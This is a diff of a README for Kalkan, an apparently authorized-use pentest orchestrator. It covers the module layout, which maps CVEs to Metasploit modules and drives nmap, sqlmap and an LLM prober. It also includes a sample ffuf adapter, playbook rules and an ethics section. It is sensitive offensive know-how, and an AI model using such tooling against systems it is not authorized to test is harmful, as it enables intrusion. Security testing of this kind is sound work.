+  audit.py             AuditLog — hash-chained, tamper-evident log
+  registry.py          tool registry
+  correlate.py         detected product/version → prioritized CVEs → next steps
+  orchestrator/
+    router.py          LLM intent routing (+ rule fallback, + summary)
+    planner.py         deterministic technique → playbook → actions
+    executor.py        scope + policy gates, runs adapters, graceful Ctrl+C abort
+  knowledge/
+    mapping.py         technique → capability → tool playbooks (the heart)
+    attack.py          full MITRE ATT&CK (STIX) knowledge base
+    atlas.py           MITRE ATLAS knowledge base
+    bridge.py          CVE (CWE/keywords) → ATT&CK/ATLAS technique + MSF module
+    msfindex.py        CVE → module index from the installed Metasploit catalog
+    navigator.py       ATT&CK Navigator coverage-layer exporter
+    vuln.py            CVE/CVSS/EPSS/KEV store
+    rules.py           detection rule catalog (how a technique looks in logs)
+  adapters/            nmap, httpx, webprobe, nuclei, ffuf, wafw00f, shodan,
+                       sqlmap, dalfox, msf, llmprobe
+  feeds/               live CVE + ATT&CK/ATLAS feed daemon
 ```
-
-### Kapsanan teknikler
-
-**ATT&CK:** T1595, T1595.001, T1595.002, T1590, T1596, T1046, T1592, T1190, T1203, T1698, T1699
-**ATLAS:** AML.T0051, AML.T0054, AML.T0057 (otomatik) + 5 teknik manuel olarak belgelenmiş
-
-`knowledge fetch` ile ATT&CK STIX verisi iner (enterprise/mobile/ics) ve **tam
-içerik** yüklenir: her teknik için açıklama (nasıl yapıldığı), tespit, veri
-kaynakları, mitigasyonlar ve gerçek prosedür örnekleri. `knowledge show
---technique T1190` hepsini + varsa playbook'u gösterir. Bunların **hepsi
-referans**; otomatik çalıştırılabilir playbook ise kürlenmiş çekirdektedir.
 
 ---
 
-## 9. Genişletme
+## 10. Extending
 
-### 9.1 Yeni araç adaptörü
+### 10.1 New tool adapter — `kalkan/adapters/<tool>.py`
+Subclass `Adapter`, declare a `ToolSpec`, implement `command()` / `parse()` (and `prepare()`/`cleanup()` if it needs temp files).
 
-```python
-# kalkan/adapters/ffuf.py
-from ..models import Action, Risk
-from ..registry import ToolSpec
-from .base import Adapter
-
-class FfufAdapter(Adapter):
-    spec = ToolSpec(
-        name="ffuf",
-        capabilities=("content_discovery",),
-        risk=Risk.ACTIVE,
-        binary="ffuf",
-        description="Dizin/içerik keşfi",
-    )
-
-    def command(self, action: Action) -> list[str]:
-        return ["ffuf", "-u", f"{action.target}/FUZZ",
-                "-w", action.args.get("wordlist", "wordlist.txt"),
-                "-of", "json", "-o", "-"]
-
-    def parse(self, stdout: str, action: Action) -> dict:
-        import json
-        try:
-            data = json.loads(stdout)
-        except json.JSONDecodeError:
-            return {}
-        return {"found": [r.get("url") for r in data.get("results", [])]}
-```
-
-Sonra `kalkan/adapters/__init__.py` içindeki `_ADAPTERS` demetine ekle.
-
-### 9.2 Yeni playbook
-
-```python
-# kalkan/knowledge/mapping.py içindeki _PLAYBOOKS demetine
-Playbook(
-    technique="T1083",
-    name="File and Directory Discovery",
-    tactic="discovery",
-    framework="attack",
-    steps=(Step("content_discovery", "ffuf", Risk.ACTIVE, {"wordlist": "common.txt"}),),
-    detection="Web sunucu loglarında 404 patlaması",
-    evidence=("found",),
-),
-```
-
-Kurallar:
-* `Step.capability` mutlaka adaptörün `spec.capabilities` içinde olmalı (test bunu zorlar).
-* `Step.required` doldurulmamışsa adım **atlanır** ve plan notuna yazılır (ör. `module`).
-* Bir adımın çıktısını sonrakine `"$open_ports"` gibi bağlayabilirsin; `Executor` çözer.
+### 10.2 New playbook — add a `Playbook` to `_PLAYBOOKS` in `kalkan/knowledge/mapping.py`
+Risky steps stay opt-in with `required=("verify",)` so they do not enter a plan without `--arg verify=1`.
 
 ---
 
-## 10. Testler
+## 11. Tests
 
 ```powershell
-python -m pytest tests/ -q          # veya: python -m unittest discover -s tests -t .
+python -m pytest -q
 ```
 
-104 test: kapsam kuralları (CIDR/domain/port/süre/risk + `scope add`), denetim zinciri
-(değiştirme/silme tespiti), planlayıcı (risk sıralaması, eksik argüman, deduplikasyon,
-playbook tutarlılığı), executor (scope ihlali, onay reddi, destructive bloğu, bağımlılık
-çözümü), CVE→ATT&CK köprüsü, feed daemon/olay akışı, rapor üretimi, nuclei `cve_id`/nmap
-`-sT`/shodan domain→IP, ve CLI varsayılan-komut/chat-shim davranışı.
-
 ---
 
-## 11. Sınırlar ve etik
+## 12. Limits and ethics
 
-* Kalkan **yalnızca yetkilendirilmiş** hedeflerde kullanılmak üzere tasarlandı. `scope.json` bir yetki belgesidir;
-  gerçek bir imza/onay sürecinin yerine geçmez.
-* `--yes` ve `--allow-destructive` üretim ortamlarında kullanılmamalı.
-* LLM prob korpusu kendi modelini ölçmek içindir; üçüncü taraf modellere izinsiz uygulanmamalı.
-* Denetim kaydı hash zinciriyle **değiştirilemezlik kanıtı** verir, ancak dosyayı tamamen silen bir saldırgana karşı
-  koruma sağlamaz. Üretimde kaydı ayrı bir makineye/SIEM'e gönder ve periyodik olarak `audit verify` çalıştır.
-
----
-
+Kalkan is strictly for **authorized** security testing. Adding a target to the scope file is a declaration that you are authorized to test it. The `destructive` tier (real exploitation, data dumping) is off by default and requires both a destructive scope ceiling and `--allow-destructive`. Every action is recorded in a tamper-evident audit log. Use it only against systems you own or are explicitly permitted to test.
